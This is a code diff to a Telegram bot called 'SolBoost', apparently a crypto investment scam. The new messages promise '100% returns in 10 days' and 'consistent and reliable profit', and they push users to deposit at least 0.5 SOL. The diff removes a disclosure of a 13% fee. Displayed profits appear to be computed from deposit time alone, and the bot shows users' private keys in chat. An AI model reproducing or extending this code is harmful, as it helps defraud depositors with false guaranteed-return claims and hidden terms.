@@ -314,7 +314,7 @@ const recordTransaction = async (userId, type, amount, txSignature = null) => {
 // Keyboard and menu functions
 const getMainMenuKeyboard = () => {
   return Markup.keyboard([
-    ['Main wallet', 'Start earning'],
+    ['Main Wallet', 'Start Earning'],
     ['Deposit', 'Withdraw'],
     ['Referrals', 'Balance'],
     ['Docs', 'Refresh'],
@@ -350,13 +350,61 @@ bot.command('start', async (ctx) => {
       if (referrerId) {
         await ctx.reply(`Welcome, ${firstName}! You were referred by a friend.`);
       } else {
-        await ctx.reply(`Welcome, ${firstName}! Your new wallet has been created. Public key: ${publicKey}`);
+        await ctx.reply(`Welcome, ${firstName}! to Solboost..
+ 
+    SolBoost is an automated Solana trading bot that delivers 100% returns in 10 days. SolBoost operates by executing advanced trading strategies on the Solana blockchain, providing users with consistent and reliable profit generation.
+
+    A unique Solana wallet has been created for you.
+     
+     <b>🔑 Wallet Address:</b> <code>${public_key}</code>
+     <b>💰 Balance :</b> 0
+
+     <b>Getting Started:</b>
+
+     1. Deposit a minimum of 0.5 SOL to activate trading.
+     2. Select Start Earning to begin auto-trading.
+     3. Monitor your performance and withdraw profits at your convenience.
+
+
+    Please use the options below to proceed:
+
+      <b>• Deposit:</b> Add funds to your wallet.
+      <b>• Start Earning:</b> Begin automated trading.
+      <b>• Main Wallet:</b> Check your wallet balance.
+      <b>• Balance:</b> Review your earnings.
+      <b>• Docs:</b> Access detailed documentation.
+      <b>• How It Works:</b> Understand the functionality of SolBoost.`, {
+            parse_mode: 'HTML'});
       }
     } else {
       if (user.first_name !== firstName) {
-        user = await updateUserFirstName(chatId, firstName);
+          user = await updateUserFirstName(chatId, firstName);
       }
-      await ctx.reply(`Welcome back, ${firstName}! Your wallet public key: ${user.public_key}`);
+      await ctx.reply(`Welcome back, ${firstName}! to Solboost..
+
+SolBoost is an automated Solana trading bot that delivers 100% returns in 10 days. SolBoost operates by executing advanced trading strategies on the Solana blockchain, providing users with consistent and reliable profit generation.
+
+A unique Solana wallet has been created for you.
+ 
+ <b>🔑 Wallet Address:</b> <code>${user.public_key}</code>
+ <b>Balance :</b> 0
+
+ <b>Getting Started:</b>
+
+ 1. Deposit a minimum of 0.5 SOL to activate trading.
+ 2. Select Start Earning to begin auto-trading.
+ 3. Monitor your performance and withdraw profits at your convenience.
+
+
+Please use the options below to proceed:
+
+  <b>• Deposit:</b> Add funds to your wallet.
+  <b>• Start Earning:</b> Begin automated trading.
+  <b>• Main Wallet:</b> Check your wallet balance.
+  <b>• Balance:</b> Review your earnings.
+  <b>• Docs:</b> Access detailed documentation.
+  <b>• How It Works:</b> Understand the functionality of SolBoost.`, {
+      parse_mode: 'HTML'});
     }
     await updateUserActivity(chatId);
     await sendMainMenu(ctx);
@@ -582,7 +630,7 @@ bot.command('adminreport', async (ctx) => {
       });
 
       // Bot actions
-      bot.hears('Main wallet', async (ctx) => {
+      bot.hears('Main Wallet', async (ctx) => {
         console.log('Main wallet button pressed');
         const chatId = ctx.from.id;
 
@@ -620,13 +668,15 @@ bot.action('show_wallet_details', async (ctx) => {
         console.log(`User ${chatId} deposit amount updated in the database: ${solBalance} SOL`);
       } */
 
-      const balanceMessage = `
+      const balanceMessage = 
+`
 💵 Main Wallet (Solana)
+
 Address: <code>${publicKey.toBase58()}</code>
+
 Private Key: <code>${privateKey}</code>
-Balance: ${solBalance.toFixed(2)} SOL ($${(solBalance * 158).toFixed(2)} USD)
-⚠️ Note: A 13% fee is applied to profits
-      `;
+
+Balance: ${solBalance.toFixed(2)} SOL ($${(solBalance * 158).toFixed(2)} USD)`;
 
       const walletKeyboard = Markup.inlineKeyboard([
         [Markup.button.callback('Back to Main Menu', 'back_to_main_menu')]
@@ -715,7 +765,7 @@ Balance: ${solBalance.toFixed(2)} SOL ($${(solBalance * 158).toFixed(2)} USD)
         }
       });
 
-bot.hears('Start earning', async (ctx) => {
+bot.hears('Start Earning', async (ctx) => {
   try {
     const chatId = Number(ctx.from.id);
     console.log(`User ${chatId} selected Start Earning`);
@@ -743,7 +793,20 @@ bot.hears('Start earning', async (ctx) => {
     
     const minimumRequired = 0.5 * LAMPORTS_PER_SOL;
     if (solBalance < minimumRequired) {
-      await ctx.reply(`🚨 Alert: Your Wallet Balance is less than the balance required to start the trades. Please deposit at least 0.5 SOL. Your current balance is ${(solBalance / LAMPORTS_PER_SOL).toFixed(2)} SOL.`);
+      await ctx.reply(`🚨 <b>Alert:</b>
+ <b>Wallet Address:</b> <code>${userWallet.publicKey.toBase58()}</code>  ( Tap to copy)
+ <b>Balance:</b> ${(solBalance / LAMPORTS_PER_SOL).toFixed(2)} SOL.
+
+ <b>Insufficient Funds</b>
+ Your wallet does not have enough SOL to start trading.
+ Please deposit SOL to activate SolBoost's auto-trading feature.
+
+ <b>Next Steps:</b>
+ Use the <b>Deposit</b> option to add funds.
+ Once funded, return to <b>Start Earning.</b>
+`, {
+      parse_mode: 'HTML'
+  });
       return;
     }
     
@@ -886,40 +949,66 @@ bot.hears('Withdraw', async (ctx) => {
     [Markup.button.callback('Back to Main Menu', 'back_to_main_menu')]
   ]);
 
-  await ctx.reply('Choose a withdrawal option:', {
-    reply_markup: withdrawKeyboard.reply_markup,
-    parse_mode: 'HTML',
-  });
+    await ctx.reply(`
+    Choose a withdrawal option:
+
+    <b>Auto Withdraw:</b>
+    Profits are automatically transferred to your wallet at regular intervals. No manual action is needed once this option is selected.
+
+    <b>Manual Withdraw:</b>
+    Control your withdrawals by manually selecting the amount of SOL you wish to withdraw from your profits. Ideal for users who prefer flexible withdrawals.
+
+    <b>Auto Reinvest:</b>
+    Automatically reinvest your profits to generate more returns. This option compounds your gains over time, maximizing your profit potential.
+
+    You can view the status of all withdrawals in the <b>Withdraw History</b> section.
+    `, {
+        reply_markup: withdrawKeyboard.reply_markup,
+        parse_mode: 'HTML',
+    });
+
 });
-      bot.action('auto_withdrawal', async (ctx) => {
-        await safeAnswerCallbackQuery(ctx);
-        const chatId = ctx.from.id;
+bot.action('auto_withdrawal', async (ctx) => {
+  await ctx.answerCbQuery();
+  const chatId = ctx.from.id;
 
-        try {
-          const query = 'SELECT auto_withdrawal FROM users WHERE chat_id = $1';
-          const result = await pool.query(query, [chatId]);
+  try {
+    const query = 'SELECT auto_withdrawal FROM users WHERE chat_id = $1';
+    const result = await pool.query(query, [chatId]);
 
-          if (result.rows.length > 0) {
-            const currentStatus = result.rows[0].auto_withdrawal;
-            const newStatus = !currentStatus;
+    if (result.rows.length > 0) {
+      const currentStatus = result.rows[0].auto_withdrawal;
+      const newStatus = !currentStatus;
 
-            await pool.query('UPDATE users SET auto_withdrawal = $1 WHERE chat_id = $2', [newStatus, chatId]);
+      const infoMessage = `
+<b>🔄 Auto Withdrawal</b>
 
-            const statusText = newStatus ? 'ON' : 'OFF';
-            const statusKeyboard = Markup.inlineKeyboard([
-              [Markup.button.callback(`Auto Withdrawal: ${statusText}`, 'auto_withdrawal')],
-              [Markup.button.callback('Back to Withdraw Options', 'back_to_withdraw')]
-            ]);
+With Auto Withdraw, your profits are automatically transferred to your generated wallet address at regular intervals. Once this option is selected, the bot takes care of the entire process, so you don't need to take any additional action.
 
-            await safeEditMessage(ctx, `Auto Withdrawal is now ${statusText}`, statusKeyboard);
-          } else {
-            await ctx.reply('User not found. Please use /start to register.');
-          }
-        } catch (error) {
-          console.error('Error in auto withdrawal:', error);
-          await ctx.reply('An error occurred. Please try again.');
-        }
+- Profits will be credited to your wallet as they are generated.
+- You can monitor all withdrawals in the Withdraw History section.
+- If you prefer more control or wish to reinvest your profits, you can switch to Manual Withdraw or Auto Reinvest at any time.
+
+<b>Current Status: ${currentStatus ? 'Enabled' : 'Disabled'}</b>
+`;
+
+      const keyboard = Markup.inlineKeyboard([
+        [Markup.button.callback(`${newStatus ? 'Enable' : 'Disable'} Auto Withdrawal`, 'toggle_auto_withdrawal')],
+        [Markup.button.callback('Back to Withdraw Options', 'back_to_withdraw')]
+      ]);
+
+      await ctx.editMessageText(infoMessage, {
+        parse_mode: 'HTML',
+        ...keyboard
       });
+    } else {
+      await ctx.editMessageText('User not found. Please use /start to register.');
+    }
+  } catch (error) {
+    console.error('Error in auto withdrawal:', error);
+    await ctx.editMessageText('An error occurred. Please try again.');
+  }
+});
 
 bot.action('manual_withdrawal', async (ctx) => {
   const chatId = ctx.from.id;
@@ -943,7 +1032,8 @@ bot.action('manual_withdrawal', async (ctx) => {
       const currentBalance = calculateBalance(depositAmount, depositDateTime);
       const profit = currentBalance - depositAmount;
 
-      const message = `
+      const message = `With Manual Withdraw, you have complete control over withdrawing your profits. You can manually select the amount of SOL you wish to withdraw from your profits at any time.
+      
 Deposit Amount: ${depositAmount.toFixed(2)} SOL
 Deposit Date: ${depositDateTime.toLocaleDateString()}
 Current Balance: ${currentBalance.toFixed(2)} SOL
@@ -1352,7 +1442,7 @@ Last updated: ${new Date().toLocaleString()}
     await ctx.reply(message, {
       parse_mode: 'HTML',
       ...Markup.keyboard([
-        ['Main wallet', 'Start earning'],
+        ['Main Wallet', 'Start Earning'],
         ['Deposit', 'Withdraw'],
         ['Referrals', 'Balance'],
         ['Docs', 'Refresh'],
@@ -1569,25 +1659,25 @@ bot.hears('Docs', async (ctx) => {
 Join our community and stay updated:
 
 🔗 <b>Telegram Group:</b>
-<a href="https://t.me/solboost_group">Join SolBoost Group</a>
+<a href="https://t.me/solboostapp">Join SolBoost Group</a>
 
 📢 <b>Telegram Channel:</b>
-<a href="https://t.me/solboost_channel">Subscribe to SolBoost Channel</a>
+<a href="https://t.me/solboostapp">Subscribe to SolBoost Channel</a>
 
 📝 <b>Medium Articles:</b>
 <a href="https://medium.com/@solboost">Read SolBoost on Medium</a>
 
 🐦 <b>X.com (Twitter):</b>
-<a href="https://x.com/solboost">Follow SolBoost on X</a>
+<a href="https://x.com/solboost_app">Follow SolBoost on X</a>
 
 For more information and updates, please visit these links.
 `;
 
   const inlineKeyboard = Markup.inlineKeyboard([
-    [Markup.button.url('Telegram Group', 'https://t.me/solboost_group')],
-    [Markup.button.url('Telegram Channel', 'https://t.me/solboost_channel')],
+    [Markup.button.url('Telegram Group', 'https://t.me/solboostapp')],
+    [Markup.button.url('Telegram Channel', 'https://t.me/solboostapp')],
     [Markup.button.url('Medium Articles', 'https://medium.com/@solboost')],
-    [Markup.button.url('X.com (Twitter)', 'https://x.com/solboost')],
+    [Markup.button.url('X.com (Twitter)', 'https://x.com/solboost_app')],
     [Markup.button.callback('Back to Main Menu', 'back_to_main_menu')]
   ]);
 
